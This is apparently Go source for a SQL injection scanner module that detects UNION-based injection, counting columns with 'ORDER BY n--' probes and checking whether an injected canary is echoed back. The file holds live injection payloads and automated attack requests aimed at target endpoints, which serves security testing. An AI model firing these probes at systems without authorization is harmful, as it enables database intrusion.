package sqliengine

import (
	"DORM/models"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
)

// ============================================================
//  UNION-BASED SQL INJECTION DETECTOR
//  Column count via ORDER BY · Canary injection · Type detection
// ============================================================

// RunUnionDetection attempts UNION-based SQL injection.
func RunUnionDetection(client *http.Client, baseURL string, target models.ScanTarget, endpoints, params []string) *models.Vulnerability {
	unionEndpoints := endpoints
	if len(unionEndpoints) > 8 {
		unionEndpoints = unionEndpoints[:8]
	}
	unionParams := []string{"id", "cat", "item", "p", "product_id", "article_id", "news_id"}

	for _, ep := range unionEndpoints {
		for _, param := range unionParams {
			baseReqURL := fmt.Sprintf("%s%s?%s=1", baseURL, ep, param)
			baseResp, err := client.Get(baseReqURL)
			if err != nil {
				continue
			}
			baseBody, _ := io.ReadAll(io.LimitReader(baseResp.Body, 65536))
			_ = baseResp.Body.Close()

			// Find number of columns via ORDER BY (1-15)
			columns := detectColumnCount(client, baseURL, ep, param, baseBody)
			if columns <= 0 {
				continue
			}

			// Test canary using UNION SELECT
			canary := "DORM_UNION_8x7k"
			unionPayloads := GetUnionPayloads(columns, canary)

			for _, unionPayload := range unionPayloads {
				unionURL := fmt.Sprintf("%s%s?%s=%s", baseURL, ep, param, url.QueryEscape(unionPayload))
				resp, err := client.Get(unionURL)
				if err != nil {
					continue
				}
				body, _ := io.ReadAll(io.LimitReader(resp.Body, 65536))
				resp.Body.Close()

				if strings.Contains(string(body), canary) {
					return &models.Vulnerability{
						Target:   target,
						Name:     "SQL Injection (UNION-Based Data Extraction)",
						Severity: "CRITICAL",
						CVSS:     9.8,
						Description: fmt.Sprintf(
							"UNION-Based SQL Injection confirmed — canary string displayed in response.\n"+
								"Endpoint: %s\nParam: %s\nColumns Count: %d\nPayload: %s",
							ep, param, columns, unionPayload,
						),
						Solution:  "Use parameterized queries. Do not show application errors to the user.",
						Reference: "OWASP A03:2021 – Injection",
					}
				}
			}
		}
	}
	return nil
}

// detectColumnCount uses ORDER BY to find the number of columns.
func detectColumnCount(client *http.Client, baseURL, ep, param string, baseBody []byte) int {
	for i := 1; i <= 15; i++ {
		orderURL := fmt.Sprintf("%s%s?%s=1 ORDER BY %d--", baseURL, ep, param, i)
		resp, err := client.Get(orderURL)
		if err != nil {
			break
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 65536))
		resp.Body.Close()

		// Error means i-1 columns
		for _, errMsg := range DBErrors {
			if strings.Contains(string(body), errMsg) {
				return i - 1
			}
		}

		// Significant size drop also indicates error
		if len(body) < len(baseBody)/2 && i > 1 {
			return i - 1
		}
	}
	return 0
}
